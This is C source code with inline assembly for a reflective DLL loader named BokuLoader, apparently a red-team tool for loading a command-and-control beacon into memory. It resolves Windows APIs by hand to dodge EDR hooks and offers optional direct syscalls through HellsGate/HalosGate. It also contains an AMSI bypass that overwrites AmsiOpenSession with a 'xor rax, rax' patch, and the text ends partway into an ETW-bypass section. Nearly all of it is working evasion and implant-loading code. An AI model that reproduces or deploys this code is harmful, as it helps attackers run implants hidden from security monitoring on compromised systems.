#define WIN32_LEAN_AND_MEAN
/* Uncomment to enable features */
//#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
//#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable 
//#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
#include <windows.h>

void* getDllBase(void*);
void* getExportDirectory(void* dllAddr);
void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
void* getExportNameTable(void* dllBase, void* dllExportDirectory);
void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory);
void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable);
void* getRdllBase();
void* getNewExeHeader(void* dllBase);
void* getDllSize(void* newExeHeader);
void* getDllSizeOfHeaders(void* newExeHeader);
void* copyMemory(void* Size, void* source, void* destination);
void* getOptionalHeader(void* NewExeHeader);
void* getSizeOfOptionalHeader(void* NewExeHeader);
void* add(void* , void* );
void* getNumberOfSections(void* newExeHeaderAddr);
void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr);
#ifdef SYSCALLS
void* findSyscallNumber(void* ntdllApiAddr);
void* HellsGate(void* wSystemCall);
void* HellDescent();
void* halosGateDown(void* ntdllApiAddr, void* index);
void* halosGateUp(void* ntdllApiAddr, void* index);
DWORD getSyscallNumber(void* functionAddress);
#endif

typedef struct Export {
    void* Directory;
    void* AddressTable;
    void* NameTable;
    void* OrdinalTable;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    void* size;
    void* SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    void* NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    void* TextSectionSize;
    Export Export;
}Dll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    void* SizeOfSection;
}Section;

typedef void*  (WINAPI * tLoadLibraryA)  (char*);
typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
typedef void*  (NTAPI  * tNtFlush)       (HANDLE, PVOID, unsigned long);
typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned long, void* );

#ifdef SYSCALLS
typedef void*  (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, unsigned long, PVOID);
typedef void*  (NTAPI  * tNtAlloc)       (HANDLE, PVOID, unsigned long, PVOID, unsigned long, unsigned long);
typedef void*  (NTAPI  * tNtFree)        (HANDLE, PVOID, PVOID, unsigned long);
#else
typedef void*  (WINAPI * tVirtualAlloc) (void*, unsigned __int64, unsigned long, unsigned long);
typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
typedef void*  (WINAPI * tVirtualFree)(void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);
#endif

#ifdef BYPASS
#ifdef SYSCALLS
typedef void*  (NTAPI  * tNtWrite)       (HANDLE, PVOID, PVOID, unsigned long, PVOID);
#else
typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
#endif
void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
    Dll ntdll;
    ntdll.dllBase             = (void*)getDllBase(ws_ntdll);
    ntdll.Export.Directory    = (void*)getExportDirectory(   (void*)ntdll.dllBase);
    ntdll.Export.AddressTable = (void*)getExportAddressTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable    = (void*)getExportNameTable(   (void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = (void*)getExportOrdinalTable((void*)ntdll.dllBase, ntdll.Export.Directory);

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K',0,'E',0,'R',0,'N',0,'E',0,'L',0,'3',0,'2',0,'.',0,'D',0,'L',0,'L',0,0};
    Dll k32;
    k32.dllBase               = (void*)getDllBase(ws_k32);
    k32.Export.Directory      = (void*)getExportDirectory(   (void*)k32.dllBase);
    k32.Export.AddressTable   = (void*)getExportAddressTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable      = (void*)getExportNameTable(   (void*)k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)k32.dllBase, k32.Export.Directory);

    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA     = (tLoadLibraryA)  getSymbolAddress(kstr1, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr2[] = {'G','e','t','P','r','o','c','A'};
    tGetProcAddress pGetProcAddress = (tGetProcAddress)getSymbolAddress(kstr2, (void*)8,  k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);

    #ifdef SYSCALLS
    // HalosGate/HellsGate to get the systemcall numbers
    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtFlushSyscallNumber = getSyscallNumber(pNtFlushInstructionCache);

    char ntstr2[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtAlloc pNtAllocateVirtualMemory = getSymbolAddress(ntstr2, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtAllocSyscallNumber = getSyscallNumber(pNtAllocateVirtualMemory);

    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, (void*)22, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtProtSyscallNumber = getSyscallNumber(pNtProtectVirtualMemory);

    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtFree pNtFreeVirtualMemory = getSymbolAddress(ntstr4, (void*)19, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    DWORD NtFreeSyscallNumber = getSyscallNumber(pNtFreeVirtualMemory);
    #else
    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = (tNtFlush)getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    char kstr3[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    tVirtualAlloc pVirtualAlloc      = (tVirtualAlloc)getSymbolAddress(kstr3, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr4[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(kstr4, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr5[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
    tVirtualFree pVirtualFree        = (tVirtualFree)getSymbolAddress(kstr5, (void*)11, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    #endif

 
    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA);
    #endif

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = (void*)getRdllBase();
    rdll_src.NewExeHeader         = (void*)getNewExeHeader(        rdll_src.dllBase);
    rdll_src.size                 = (void*)getDllSize(             rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(    rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = (void*)getOptionalHeader(      rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = (void*)getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = (void*)getNumberOfSections(    rdll_src.NewExeHeader);

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase = NULL;
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtAllocSyscallNumber);
    HellDescent((HANDLE)-1, &rdll_dst.dllBase, 0, &rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #else
    rdll_dst.dllBase = (void*)pVirtualAlloc(NULL, (unsigned __int64)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    #endif

    // Optionally write Headers from initial source RDLL to loading beacon destination memory
    #ifdef NOHEADERCOPY
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtFreeSyscallNumber);
    // 0x00008000 -> MEM_RELEASE
    SIZE_T RegionSize = 1;
    HellDescent((HANDLE)-1, &rdll_dst.dllBase, &RegionSize, 0x00008000); // Deallocate the first memory page (4096/0x1000 bytes) 
    #else
    pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
    #endif
    #else
    copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);
    #endif

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag = FALSE;
    __int64 numberOfSections = (__int64)rdll_src.NumberOfSections;
    rdll_src.NthSection      = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC \n" // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[SectionRVA] "=r" (section.RVA)        // RAX OUT
            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add rax, 0x14 \n" // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[PointerToRawData] "=r" (section.PointerToRawData)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10 \n" // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[SizeOfSection] "=r" (section.SizeOfSection) // RAX OUT
            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov rbx, [rax] \n" // name of the section
                "xor rax, rax \n"
                "mov rdx, 0x747865742e \n" // 0x747865742e == '.text'
                "cmp rbx, rdx \n"
                "jne nottext \n"
                "mov rax, 0x1 \n"
                "nottext: \n"
                :[textSectionFlag] "=r" (textSectionFlag) // RAX OUT
                :[nthSection] "r" (rdll_src.NthSection) // RAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            if(textSectionFlag == TRUE)
            {
                rdll_dst.TextSection = section.dst_rdll_VA;
                rdll_dst.TextSectionSize = section.SizeOfSection;
            }
        }
        // Copy the section from the source address to the destination for the size of the section
        copyMemory(section.SizeOfSection, section.src_rdll_VA, section.dst_rdll_VA);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src.NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src.OptionalHeader + 0x78;
    // Get the Address of the Import Directory from the Data Directory
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *importName, *LookupTableEntry, *AddressTableEntry, *EntryName, *len_EntryName, *nullCheck;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n"  // RVA of Import Directory
        "add rdx, rbx \n"    // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg rax, rdx \n"
        :[ImportDirectory] "=r" (ImportDirectory) // RAX OUT
        :[DataDirectory] "r" (DataDirectory), // RAX IN 
         [dllBase] "r" (rdll_dst.dllBase)     // RDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "xor rbx, rbx \n"
        "add rdx, 0xC \n"        // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ebx, [rdx] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
        "pop rdx \n"             // R12&RBX = RVA of Name DLL
        "cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
        "je check1 \n"
        "add rax, rbx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
        "check1: \n"
        :[importNameRVA] "=r" (importNameRVA),  // RDX OUT 
         [importName] "=r" (importName) // RAX OUT 
        :[dllBase] "r" (rdll_dst.dllBase), // RAX IN
         [nImportDesc] "r" (nImportDesc)// RDX IN 
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = (void*)getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = (void*)pLoadLibraryA((char*)(importName));
        }
        __asm__(
            "xor rbx, rbx \n"        // importLookupTableEntry = VA of the OriginalFirstThunk
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add rbx, rdx \n"        // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
            "xchg rax, rbx \n"
            :[LookupTableEntry] "=r" (LookupTableEntry)
            :[nImportDesc] "r" (nImportDesc),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        __asm__(
            "xor rbx, rbx \n"        // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
            "add rax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add rbx, rdx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
            "xchg rax, rbx \n"
            :[AddressTableEntry] "=r" (AddressTableEntry)
            :[nImportDesc] "r" (nImportDesc),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        __asm__(
            "mov rax, [rax] \n"
            :[nullCheck] "=r" (nullCheck)
            :[AddressTableEntry] "r" (AddressTableEntry)
        );
        while(nullCheck)
        {
            dll_import.Export.Directory    = getExportDirectory(   dll_import.dllBase);
            dll_import.Export.AddressTable = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NameTable    = getExportNameTable(   dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.OrdinalTable = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "xor rdx, rdx \n"          // located in the Export Directory in memory of the module which functions/api's are being imported
                    "add rax, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
                    "xchg rax, rdx \n"
                    :[BaseOrdinal] "=r" (BaseOrdinal)
                    :[Directory] "r" (dll_import.Export.Directory)
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov rax, [rax] \n"        // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n"       // get rid of the 8
                    :[importEntryHint] "=r" (importEntryHint)
                    :[LookupTableEntry] "r" (LookupTableEntry)
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    :[TableIndex] "=r" (TableIndex)
                    :[importEntryHint] "r" (importEntryHint),
                     [BaseOrdinal] "r" (BaseOrdinal)
                );
                __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                    "mov r12, rdx \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"           // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"               // importEntryExportTableIndex * sizeof(DWORD)
                    "add rax, r12 \n"          // RVA for our functions address
                    "xor rbx, rbx \n"
                    "mov ebx, [rax] \n"        // The RVA for the executable function we are importing
                    "add rcx, rbx \n"          // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx \n"
                    :[EntryAddress] "=r" (EntryAddress)
                    :[TableIndex]"r"(TableIndex),                       // RAX IN - importEntryExportTableIndex
                    [AddressTable]"r"(dll_import.Export.AddressTable),  // RDX IN - AddressTable 
                    [dllBase] "r" (dll_import.dllBase)                  // RCX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[AddressTableEntry] "r" (AddressTableEntry),  // RAX IN = The import table entry we are going to overwrite
                     [EntryAddress] "r" (EntryAddress)             // RDX IN 
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    :[EntryName] "=r" (EntryName) 
                    :[AddressTableEntry] "r" (AddressTableEntry),  // import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                     [dllBase] "r" (rdll_dst.dllBase)
                );
                __asm__(
                    "xor rcx, rcx \n"   // Get the string length for the import function name
                    "countLoop: \n"
                    "inc cl \n"         // increment the name string length counter
                    "xor rbx, rbx \n"
                    "cmp bl, [rax] \n"  // are we at the null terminator for the string?
                    "je fStrLen \n"
                    "inc rax \n"        // move to the next char of the string
                    "jmp short countLoop \n"
                    "fStrLen: \n"
                    "xchg rax, rcx \n" 
                    :[len_EntryName] "=r" (len_EntryName) 
                    :[EntryName] "r" (EntryName) 
                );    
                // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                EntryAddress = getSymbolAddress(EntryName, len_EntryName, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
                // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
                if (EntryAddress == NULL){
                    EntryAddress = (void*)pGetProcAddress((HMODULE)dll_import.dllBase, (char*)EntryName);
                }
                __asm__(
                    "mov [rax], rdx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[AddressTableEntry] "r" (AddressTableEntry),  // import table entry we are going to overwrite
                     [EntryAddress] "r" (EntryAddress) 
                );
            }
            AddressTableEntry += 0x8;
            if(LookupTableEntry)
                LookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                :[nullCheck] "=r" (nullCheck)
                :[AddressTableEntry] "r" (AddressTableEntry)
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "xor rbx, rbx \n"
            "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name 
            "push rbx \n"       // save the RVA for the Name of the DLL to be imported to the top of the stack
            "pop rax \n"        // RVA of Name DLL
            "cmp ebx, 0x0 \n"   // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
            "je check2 \n"
            "add rdx, rbx \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
            "check2: \n"
            :[importName] "=r" (importName),       // RDX OUT
             [importNameRVA] "=r" (importNameRVA)  // RAX OUT
            :[nImportDesc] "r" (nImportDesc),
             [newRdllAddr] "r" (rdll_dst.dllBase)
        );
    }
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add rdx, 0x18 \n"            // OptionalHeader.ImageBase
        "mov rdx, [rdx] \n"
        "sub rax, rdx \n"             // dllBase.ImageBase
        :[BaseAddressDelta] "=r" (BaseAddressDelta)
        :[dllBase] "r" (rdll_dst.dllBase),
        [OptionalHeader] "r" (rdll_src.OptionalHeader)
    );
    void* RelocDir = rdll_src.OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rdx] \n"           // 4 byte DWORD Virtual Address of the Relocation Directory table
        "add rax, rbx \n"             // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        :[nextRelocBlock] "=r" (nextRelocBlock)
        :[dllBase] "r" (rdll_dst.dllBase),
        [RelocDir] "r" (RelocDir)       
    );
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax+0x4] \n"       // 4 byte DWORD Size of the Relocation Directory table 
        "xchg rax, rbx \n"
        :[RelocDirSize] "=r" (RelocDirSize)
        :[RelocDir] "r" (RelocDir)
    );
    
    if(RelocDirSize) // check if their are any relocations present
    {
        __asm__(
            "xor rbx, rbx \n"
            "mov ebx, [rax+0x4] \n"   // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            "xchg rax, rbx \n"
            :[relocBlockSize] "=r" (relocBlockSize)
            :[nextRelocBlock] "r" (nextRelocBlock)
        );
        while(relocBlockSize)
        {
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rdx] \n"   // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                "add rax, rbx \n"     // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                :[relocVA] "=r" (relocVA)
                :[dllBase] "r" (rdll_dst.dllBase),
                 [nextRelocBlock] "r" (nextRelocBlock)
            );
            __asm__(
                "xor rbx, rbx \n"
                "xor rdx, rdx \n"
                "inc bl \n"
                "inc bl \n"           // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"      // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"           // relocBlockSize/2
                :[RelocBlockEntries] "=r" (RelocBlockEntries)
                :[relocBlockSize] "r" (relocBlockSize)
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor rbx, rbx \n"
                    "mov bx, [rax] \n"   // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rbx \n"
                    "shr rbx, 0x0C \n"   // Check the 4 bit type
                    "cmp bl, 0x0A \n"    // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"   // the last 12 bits is the offset, the first 4 bits is the type
                    "add rdx, rax \n"    // in memory Virtual Address of our current relocation entry
                    "mov rbx, [rdx] \n"  // value of the relocation entry
                    "add rbx, rcx \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [rdx], rbx \n"  // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    :[nextRelocBlockEntry] "r" (nextRelocBlockEntry),
                    [relocVA] "r" (relocVA),
                    [BaseAddressDelta] "r" (BaseAddressDelta)
                );
                nextRelocBlockEntry += 0x2;
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rax+0x4] \n"  // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock 
                "xchg rax, rbx \n"
                :[relocBlockSize] "=r" (relocBlockSize)
                :[nextRelocBlock] "r" (nextRelocBlock)
            );
        }
    }
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
    unsigned long oldprotect = 0;
    #ifdef SYSCALLS
    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
    HellDescent((HANDLE)-1, &rdll_dst.TextSection, &rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);

    HellsGate((void*)(ULONG_PTR)NtFlushSyscallNumber);
    HellDescent((HANDLE)-1, NULL, 0 );
    #else
    pVirtualProtect(rdll_dst.TextSection, (unsigned __int64)rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);
    pNtFlushInstructionCache((void*)-1, NULL, 0);
    #endif

    ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

#ifdef BYPASS
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
    PVOID Base;
    SIZE_T Size;
    unsigned long oldprotect;
    SIZE_T bytesWritten;

    #ifdef SYSCALLS
    char ntstr5[] = {'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtWrite pNtWriteVirtualMemory = getSymbolAddress(ntstr5, (void*)20, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
    DWORD NtWriteSyscallNumber = getSyscallNumber(pNtWriteVirtualMemory);
    char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtProt pNtProtectVirtualMemory = getSymbolAddress(ntstr3, (void*)22, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
    DWORD NtProtSyscallNumber = getSyscallNumber(pNtProtectVirtualMemory);
    #else
    char wpm[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0};
    tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(wpm, (PVOID)18, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
    #endif
    // ######### AMSI.AmsiOpenSession Bypass
    char as[] = {'a','m','s','i','.','d','l','l',0};
    Dll amsi;
    amsi.dllBase = (void*)getDllBase((void*)as); // check if amsi.dll is already loaded into the process
    if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        amsi.dllBase = (void*)pLoadLibraryA((char*)(as));
    }

    if (amsi.dllBase != NULL) {
        amsi.Export.Directory      = (void*)getExportDirectory(   (void*)amsi.dllBase);
        amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
        amsi.Export.NameTable      = (void*)getExportNameTable(   (void*)amsi.dllBase, amsi.Export.Directory);
        amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
        void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);

        unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
        Base = pAmsiOpenSession;
        Size = sizeof(amsibypass);

        // make memory region RWX
        #ifdef SYSCALLS
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
        HellDescent((HANDLE)-1, pAmsiOpenSession, amsibypass, sizeof(amsibypass), &bytesWritten);
        // make memory region RX again
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
        #else
        pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, Size, &bytesWritten);
        #endif
    }

    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
